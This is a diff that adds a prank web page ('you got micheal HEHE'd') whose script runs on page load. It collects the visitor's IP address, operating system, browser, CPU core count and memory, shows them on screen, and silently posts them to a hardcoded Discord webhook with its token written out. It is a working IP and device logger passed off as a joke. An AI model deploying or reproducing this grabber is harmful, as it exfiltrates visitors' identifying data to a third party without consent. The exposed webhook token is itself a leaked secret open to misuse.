@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>you got micheal HEHE'd'!</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: #111;
+            color: white;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+        }
+
+        .container {
+            background: #222;
+            padding: 25px;
+            border-radius: 10px;
+            width: 600px;
+        }
+
+        h1 {
+            text-align: center;
+            color: #00ff88;
+        }
+
+        .item {
+            margin: 12px 0;
+        }
+
+        .label {
+            color: #00ff88;
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <h1>you just got micheal HEHE'd! micheal jackson ran away with your personal data and gave it to miles!</h1>
+
+    <div class="item"><span class="label">IP Address:</span> <span id="ip">Loading...</span></div>
+    <div class="item"><span class="label">Operating System:</span> <span id="os">Loading...</span></div>
+    <div class="item"><span class="label">Browser:</span> <span id="browser">Loading...</span></div>
+    <div class="item"><span class="label">CPU Cores:</span> <span id="cores">Loading...</span></div>
+    <div class="item"><span class="label">RAM:</span> <span id="ram">Loading...</span></div>
+    <div class="gif-wrapper">
+        <div class="tenor-gif-embed" data-postid="9973731935510399433" data-share-method="host" data-aspect-ratio="1" data-width="100%">
+            <a href="https://tenor.com/view/mjsphere-michael-jackson-michael-jackson-ball-gif-9973731935510399433">Mjsphere Michael Jackson Sticker</a> from 
+            <a href="https://tenor.com/search/mjsphere-stickers">Mjsphere Stickers</a>
+        </div>
+    </div>
+</div>
+
+<!-- Tenor Script placed at the bottom for better performance -->
+<script type="text/javascript" async src="https://tenor.com/embed.js"></script>
+
+
+<script>
+async function loadInfo() {
+    // Get IP
+    try {
+        const response = await fetch("https://api.ipify.org?format=json");
+        const data = await response.json();
+        document.getElementById("ip").textContent = data.ip;
+    } catch {
+        document.getElementById("ip").textContent = "Unavailable";
+    }
+
+    // Detect OS
+    const ua = navigator.userAgent;
+    let os = "Unknown";
+
+    if (ua.includes("Windows")) os = "Windows";
+    else if (ua.includes("Mac")) os = "macOS";
+    else if (ua.includes("Linux")) os = "Linux";
+    else if (ua.includes("Android")) os = "Android";
+    else if (ua.includes("iPhone") || ua.includes("iPad")) os = "iOS";
+
+    document.getElementById("os").textContent = os;
+
+    // Browser
+    document.getElementById("browser").textContent =
+        navigator.userAgentData?.brands?.map(b => b.brand).join(", ")
+        || navigator.userAgent;
+
+    // CPU Cores
+    document.getElementById("cores").textContent =
+        navigator.hardwareConcurrency || "Unknown";
+
+    // RAM
+    document.getElementById("ram").textContent =
+        navigator.deviceMemory
+            ? navigator.deviceMemory + " GB"
+            : "Unavailable";
+
+    // Send data to server
+    const webhookURL = "https://discord.com/api/webhooks/1517010283506303099/X6HCHoNcNfHlDO_OlO1GGZqB205OBO--qFfbkSz8lu7aEmmRDEMRBrHhjDw85bSlx_ZP";
+    const payload = {
+        content: `**New Submission!**\nIP: ${document.getElementById("ip").textContent}\n OS: ${document.getElementById("os").textContent}\n Browser: ${document.getElementById("browser").textContent}\n Cores: ${document.getElementById("cores").textContent}\n RAM: ${document.getElementById("ram").textContent}`
+    };
+    fetch(webhookURL, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(payload)
+    })
+}
+
+loadInfo();
+</script>
+
+</body>
+</html>
